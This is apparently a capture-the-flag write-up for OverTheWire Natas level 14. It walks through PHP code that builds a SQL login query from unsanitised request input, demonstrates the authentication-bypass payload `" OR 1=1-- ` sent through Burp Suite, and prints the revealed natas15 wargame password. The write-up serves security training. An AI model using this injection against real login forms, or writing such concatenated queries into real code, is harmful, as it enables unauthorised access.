# Level 14

## Software used
- Google Chrome + FoxyProxy
- Burpsuite Community
- [onlinephp.io](https://onlinephp.io/)

## Hint

```php
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>
```

## Solution

As always let's break down the sourcecode.  
[$\_REQUEST](https://www.php.net/manual/en/reserved.variables.request.php): An associative array that by default contains the contents of $\_GET, $\_POST and $\_COOKIE.  
[mysqli_connect](https://www.php.net/manual/en/function.mysqli-connect.php): This function is an alias of: [mysqli::\_\_construct()](https://www.php.net/manual/en/mysqli.construct.php)  
[mysqli_select_db](https://www.php.net/manual/en/mysqli.select-db.php):  Selects the default database for database queries

```php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');
```

If key 'username' exists in $\_REQUEST, then create a variable $link which is a representation of a connection to a MySQL database.  
Its values are hostname, username, password.  
As last step the php built-in function mysqli_select_db() is used to select the databse 'natas14'.  

```php
$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```
The next step, the variable $query is declared which contains a SELECT query for MySQL
```php
<?php

$array = array(
	
	"username" => "natas14",
	"password" => "fakepassword"
);

$query = "SELECT * from users where username=\"".$array["username"]."\" and password=\"".$array["password"]."\"";

echo $query

?>
```
> SELECT * from users where username="natas14" and password="fakepassword"


```php
if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>
```
[mysqli_num_rows](https://www.php.net/manual/en/mysqli-result.num-rows.php): Gets the number of rows in the result set  
[mysqli_close](https://www.php.net/manual/en/mysqli.close.php): Closes a previously opened database connection
If key 'debug' exists in $\_GET, prints back the message executing query.  
If the number of rows returned from the database query is greater than 0, then prints back the message containing the password for natas15, otherwise prints back the error message 'Access denied'.  
Close the connection to the dataase.



Payload to inject: `" OR 1=1-- `

```php
<?php

$array = array(
	
	"username" => 'natas14',
	"password" => '" OR 1=1-- ',
);

$query = "SELECT * from users where username=\"".$array["username"]."\" and password=\"".$array["password"]."\"";

echo $query

?>
```
> SELECT * from users where username="natas14" and password="" OR 1=1-- "  

Since 1=1 is always True, even if the password is wrong or empty the whole query results to be True and the application executes correctly.  
Sending payload within Burpsuite requires the payload to be urlencoded:  

<img src="https://github.com/jupitersinsight/writeups/assets/110602224/6afcba5f-1792-4e4e-b2e7-a2dc062ec4b4" widht=900 height=auto>

The password for natas15 is: **TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB**

